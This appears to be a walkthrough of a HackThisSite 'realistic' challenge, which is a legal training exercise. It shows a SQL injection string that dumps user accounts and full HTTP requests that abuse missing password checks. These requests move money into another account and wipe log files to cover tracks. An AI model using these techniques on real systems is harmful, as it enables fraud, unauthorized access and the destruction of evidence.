# 3 Goals
- Find Gary Hunter's account.
- Move the `10,000,000$` to `dropCash`
- Clear the logs (at `/logFiles`)

## Finding Gary Hunter's account
### Basic Info
There's login and register. Also you can search description of users.
dropCash had in his description, his password which is:
```
123abc
```
In addition the hash is given once you log in:
```
a906449d5769fa7361d7ecc6aa3f6d28
```
I wanted to find out what the hash was.
I found out it was MD5:
```zsh
╰─ printf '123abc' | openssl dgst -md5                 
MD5(stdin)= a906449d5769fa7361d7ecc6aa3f6d28
```
The password is saved as a cookie in plain text after the call to POST to `login2.php` from `login1.php`:
```
Set-Cookie: accountUsername=dropCash
Set-Cookie: accountPassword=123abc
```
### Vulnerabilities:
You could also clear the files in the home directory without the the real password.
You can also clear the logFiles by changing the dir parameter to `logFiles`:
```
POST /missions/realistic/8/cleardir.php HTTP/2
Host: www.hackthissite.org
Cookie: accountUsername=dropCash; accountPassword=123abcd; HackThisSite=X
Content-Length: 12
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Origin: https://www.hackthissite.org
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://www.hackthissite.org/missions/realistic/8/login2.php
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

dir=logFiles
```
I got back:
```
You cleared the logfiles, but you haven't transfered any money.
```

It looked like the `movemoney.php` also did not check for password validity.
I also found that there was SQL injection in the search for user:
```
a' or 1=1 -- 
```
Gave back all the users. This is how I found Gary's account to be:
```
GaryWilliamHunter : -- $$$$$ --
```
## Moving the 10,000,000$ to dropCash
I then just tried to transfer all the money using the following request:
```
POST /missions/realistic/8/movemoney.php HTTP/2
Host: www.hackthissite.org
Cookie: accountUsername=GaryWilliamHunter; accountPassword=123abc; HackThisSite=X
Content-Length: 27
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Origin: https://www.hackthissite.org
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://www.hackthissite.org/missions/realistic/8/login2.php
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

TO=dropCash&AMOUNT=10000000
```
And I got back:
```html
<p style="text-align: center;">
  Congratulations, 1st Objective Done, Now Cover Your Tracks<br />
  <br />
  <a href="index.php">
    &lt;- Back to index
  </a>
</p>
```
## Clearing the logs
I then wanted to clear the logs using:
```
POST /missions/realistic/8/cleardir.php HTTP/2
Host: www.hackthissite.org
Cookie: accountUsername=GaryWilliamHunter; accountPassword=123abc; HackThisSite=X; movedTheMoneyIntodropCashAccountFinished=12RqDLfqZdMoU
Content-Length: 20
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Origin: https://www.hackthissite.org
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://www.hackthissite.org/missions/realistic/8/login2.php
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

dir=logFiles
```
and it worked!